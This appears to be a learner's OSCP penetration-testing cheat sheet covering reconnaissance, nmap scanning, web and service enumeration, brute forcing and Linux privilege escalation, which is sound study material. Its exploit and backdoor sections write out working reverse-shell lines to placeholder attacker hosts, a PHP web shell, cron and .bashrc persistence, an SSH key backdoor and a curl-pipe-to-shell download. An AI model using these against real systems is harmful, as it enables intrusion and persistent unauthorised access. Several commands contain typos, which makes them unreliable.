# OSCP-Cheatsheet
The essential tools and procedure Kaoryu for OSCP  
You can find important upload on top of page
## Global RoadMap for Pentest _For Linux_
### 1. Passive recognition
 - Command helpful for passive recognition 
```bash
whois <sitename.example>
# query the DB whois to list the informations of a domain name
nslookup -type=A <sitename.example> <IP address>
# list the IPv4 link at this domain name
nslookup -type=MX nomdedomaine.exemple <IP address>
# list the mail server at this domain name
```
 - 2 sites more helpful and wider than command  
   [DNSdumper.com](DNSdumper.com) and [Shodan.io](Shodan.io)
### 2. System enumeration
#### 2.1 Scan Port
 - **Nmap** and these most useful parameters
```bash
nmap -sS <IP address>
#nmap with the flag SYN
nmap -sL <IP address>-255
#allow to test a range of IP address
nmap -sL <IP address>/29
#allow to scan all IP address of a subnet here subnet 29
sudo nmap -PR -sn <IP address>
#-PR only scan with ARP request and don't scan the ports with -sn
sudo nmap -S SPOOFED_IP <IP address>
#scan with spoofed address
nmap -D DECOY_IP,ME <IP address>
#scan with decoy adress
sudo nmap -sI ZOMBIE_IP <IP address>
#scan from zombie address (ex: old printer)
nmap --reason <IP address>
#explains his reason of why this port or this port is open
nmap -sV --version-all <IP address>
#Connexion 3-way handshake to know the version of services
sudo nmap -sS -O <IP address>
#detection of l'OS
sudo nmap -sS --traceroute <IP address>
#like traceroute but with nmap
sudo nmap -sS --script=<default> <IP address>
#allow to use a script by default stored here: /usr/share/nmap/scripts
sudo nmap -sS -oG <foldername> <IP address>
#transfer the result to new folder grepable 
# -p- scan all ports, -f ou -ff (divide the packets for firewalls)
sudo nmap -sN -oG NOM_DU_FICHIER <IP address>
#use -sN for the null Flag and don't be detect by IPS
```
#### 2.2 HTTP/S enumeration
- port 80 http and port 443 https
- Inspect source code, request http, cookies, and storage in application,...
- If a image look suspicious dowload it and use steganography
```bash
binwalk <image.jpg>
#allow to see if a other folder is hide in image / does not work every time
binwalk -e <image.jpg> 
#extract hidden data
stegide extract -sf <image.jpg> -p <passphrase>
#allow to extract data lock with password
stegseek <image.jpg> /usr/share/wordlists/rockyou.txt
#brute force the password of date 
```
- Common http directory `/robots.txt`,`sitemap.xml`,`/images`,`/admin`,`/bin`,`/cgi-bin`,`/stats`,`/icons`,`/doc`,`/docs`
- We can automatize enumeration 
```bash
gobuster dir -u http://<IP address> -w /usr/share/worldist.txt -x txt,xml,js,css,html,php
ffuf -u http://<IP address>/FUZZ -w /usr/share/worldist.txt -p "0.1" -H "Name:Value" (-H = Header)
#scan wide hidden directory 
nikto -h http://<IP address>
#in addition to gobuster or ffuf scan
```
#### 2.3 SMB enumeration
- port 445 by default
```bash
#enum4linux -a http://<IP address>
enumeration of SMB server
```
#### 2.4 SSH enumeration
- port 22 by default
```bash
telnet <IP address> 22
#use telnet (TCP/IP text) to communicate with ssh
ssh <name>@<IP address>
ssh -i ~/Path/to/id_rsa <name>@<IP address>
#if you need to connect with key rsa
```
#### 2.5 FTP enumeration
- port 21 by default
- if FTP is on anonymous mode user=anonymous pass=whateveryouwant
```bash
telnet <IP address> 21
#use telnet (TCP/IP text) to communicate with FTP, tap ctrl+alt+] and quit to extract
ftp <IP address> <port>
USER or PASS to connect
you can use ls and get FILENAME
```
### 3. Exploit
#### 3.1 TOP 10 OWASP
- important site recap [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html)  
  ##### Top 1 Broken acces control
  - you need to try the website, change id user, know the ressource of site,.... 
  - IDOR (insecure direct object reference) just modify :
  ```bash
  #change parameters post, change id, try and see the response of server 200,404,302 
  http://example.com/user/"35" or http://example.com/user/file.php?image="4",...
  ```
  ##### Top 2 Cryptographic failures
  - poor Cryptographic implementation, deprecied or insecure algorithm
  - PNRG (Pseudo Random Génerator Number) sometime algorithm use to generate a random number for crypto is predictably (like random in python)
  - Algorithms of simetric encryption :
  ```test
  AES 128,192,256 bits (secure, industrie standard)
  RC6 (secure, but not a industrie standard)
  DES 56bits key too small
  3DES deprecied and replace by AES
  RC4 not secure but fast
  RC5 not secure but fast
  ```
  - Algorithms of asimetric encryption :
  ```test
  RSA 1024,2048,3072,4096bits (1024 not secure)
  Diffie hellman (only use for exchange key)
  ```
  - Algorithms of hashage :
  ```test
  MD2, MD4, MD5, MD6 (not secure depricied)
  SHA-1 (not secure depricied)
  SHA-2 (224,256,384,512) secure
  SHA-3 secure
  RIPEMD (128,160,256,320) secure use in bitcoin
  bcrypt: Variable-length hash, typically 22-34 characters long, with a salt value and a work factor (iterations).
  PBKDF2: Variable-length hash, typically 32-64 characters long, with a salt value and a work factor (iterations).
  Argon2: Variable-length hash, typically 32-64 characters long, with a salt value and a work factor (iterations).
  ```
  - Algorithms of HMAC :
  ```bash
  HS256, HS384 and HS512
  ```
  ##### Top 3 injection breach
  - Command injection
  - XSS (Cross Site Scripting)
  - SQL Injection
  ##### Top 4 non-secure application
  ##### Top 5 bad configuration
  ##### Top 6 composant vulnerability
  ##### Top 7 authentification failure
  ##### Top 8 failure integrity data
  ##### Top 9 journalisation defect
  ##### Top 10 SSRF breach
#### 3.2 Reverse shell
- reverse shell linux [hacktricks.xyz/reverse-shells/linux](https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/linux)
```php
<?php exec("/bin/bash -c 'bash -i > /dev/tcp/ATTACKING-IP/1234 0>&1'");
#simple balise php
```
#### 3.3 Password bruteforce
- before bruteforce prefer to find a valid username because combination of bruteforce username and password is very very long
```bash
hydra -l <username> -P /usr/share/worldist.txt <IP address> http-post-form "/login:login=^USER^&password=^PASS^:message_erreur" #header parameters
#allow to brutforce http page
hydra -s <port> -l <username> -P /usr/share/worldist.txt -t 64 -vV -f <protocol>://<adresse IP>
#syntax of hydra, for more speed remove -t 64
```
#### 3.4 Hashcracking
- Popular type of hash :
```test
MD5: 32-character hexadecimal hash, often used for file integrity and password storage.
SHA-1: 40-character hexadecimal hash, commonly used for digital signatures and password storage.
SHA-256: 64-character hexadecimal hash, widely used for cryptographic purposes, including password storage and digital signatures.
bcrypt: Variable-length hash, typically 22-34 characters long, with a salt value and a work factor (iterations).
PBKDF2: Variable-length hash, typically 32-64 characters long, with a salt value and a work factor (iterations).
Argon2: Variable-length hash, typically 32-64 characters long, with a salt value and a work factor (iterations).
```
- hascat
### 4. escalation privilege LINUX
- You need to search about kernel version, user and group, services, logs, host directory,.... 
- see the important location file in documents of this page
```bash
uname -a
#give name of host and kernel
id
#name and group user
sudo -l
#allow look if user have permission to use sudo
getcap -r / 2>/dev/null
#list user capabilities
find / -type f -perm -04000 -ls 2>/dev/null
#list folder with SUID or GUID
cat /etc/crontab
#list user crontrab (they can be modifed for be execute by root)
```
- if there are SUID ou GUID look [gtfobins.io](https://gtfobins.github.io/)
- for tansfer script or folder with server/attacker machine :
```bash
# Local network
sudo python3 -m http.server 80 #Host
curl 10.10.10.10/linpeas.sh | sh #Victim

#Don't forget to give permission to execute script
chmod +x script.sh
```
- can automatize enumeration system with [linpeas.sh](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) or [LinEnum.sh](https://github.com/rebootuser/LinEnum)
```bash
./linpeas.sh
```
#### Backdoor
- SSH backdoor this consiste at generate ssh keygen and put our public key in /home/user/.shh of your target
- isn't secret
```bash
#go in /home/attacker/.shh and generate private and public key
ssh-keygen -t rsa -b 4096
chmod 600 id_rsa
#now transfer id_rsa.pub via netcat or whatever you want in home/target/.ssh and rename file in authorized_key
nc <target ip> -lvnp <port> < id_rsa.pub #host
nc <attacker ip> <port> < authorized_key #target
```
- Php backdoor copy this in some file in /var/www/html and change cmd because its a common request 
```php
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
```
- Crontab backdoor
```bash
sudo crontab -e #sudo if you can, it's for add rule in crontab
* * * * * bash -i >& /dev/tcp/<IP>/<port 0>&1 #execute every min this command
nc -lvnp <port> #on your machine who want connect
```
- ~/.bashrc backdoor
```bash
#.bashrc, exe file launch when a termil bash it started
cat /etc/passwd #verif if user use /bin/bash
chsh -l <username> #modif default shell
echo 'bash -i >& /dev/tcp/<IP>/<port> >&1' >> ~/.bashrc #payload backdoor
nc -lvnp <port> #on your machine who want connect
```
### 5. escalation privilege WINDOWS
## Important tools
### Burpsuite
 #### 1. intruder
 - allow to brut force with multiple wordlist
 #### 2. repeater
 #### 3. sequencer
 #### 4. comparer
 #### 5. macro
send a request capture by proxy to modify manuely
### wireshark

  
